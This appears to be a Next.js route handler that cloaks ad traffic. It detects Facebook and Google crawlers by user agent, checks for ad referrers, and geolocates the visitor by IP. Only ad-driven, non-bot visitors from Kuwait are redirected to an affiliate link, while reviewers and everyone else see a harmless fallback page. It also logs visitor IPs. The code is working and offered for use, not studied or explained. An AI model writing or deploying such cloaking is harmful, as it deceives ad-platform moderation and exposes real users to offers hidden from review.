import { type NextRequest, NextResponse } from "next/server"

export const dynamic = "force-dynamic" // Ensure this is not cached

export async function GET(request: NextRequest) {
  // Get IP address, user agent, and referrer
  const ip = request.headers.get("x-forwarded-for") || "unknown"
  const userAgent = request.headers.get("user-agent") || ""
  const referrer = request.headers.get("referer") || "direct"
  const url = new URL(request.url)

  // Target country
  const targetCountry = "KW" // Kuwait

  // Redirect URLs
  const affiliateLink = "https://muikwu.com/"
  const fallbackLink = "https://mokalfy.netlify.app/"

  // Check if visitor is a bot
  const bots = ["facebookexternalhit", "Facebot", "Googlebot", "crawler", "bot", "slurp", "spider"]
  const isBot = bots.some((bot) => userAgent.toLowerCase().includes(bot.toLowerCase()))

  // Check if visit is from an ad
  const adSources = ["facebook.com", "fb.com", "t.co", "google.", "doubleclick.net", "utm_source", "gclid"]
  const isAdClick = adSources.some(
    (source) =>
      referrer.toLowerCase().includes(source.toLowerCase()) ||
      url.toString().toLowerCase().includes(source.toLowerCase()),
  )

  // Get country information from IP
  let countryCode = "KW"
  try {
    const response = await fetch(`https://ipapi.co/${ip}/json/`)
    if (response.ok) {
      const data = await response.json()
      countryCode = data.country_code || "UNKNOWN"
    }
  } catch (error) {
    console.error("Error fetching IP data:", error)
  }

  // Determine redirect destination
  const redirectUrl = !isBot && countryCode === targetCountry && isAdClick ? affiliateLink : fallbackLink

// TODO: remove this line
  // Log the redirect decision (optional)
  console.log({
    ip,
    countryCode,
    isBot,
    isAdClick,
    redirectTo: redirectUrl,
  })

  // Return redirect response
  return NextResponse.redirect(redirectUrl, { status: 302 })
}

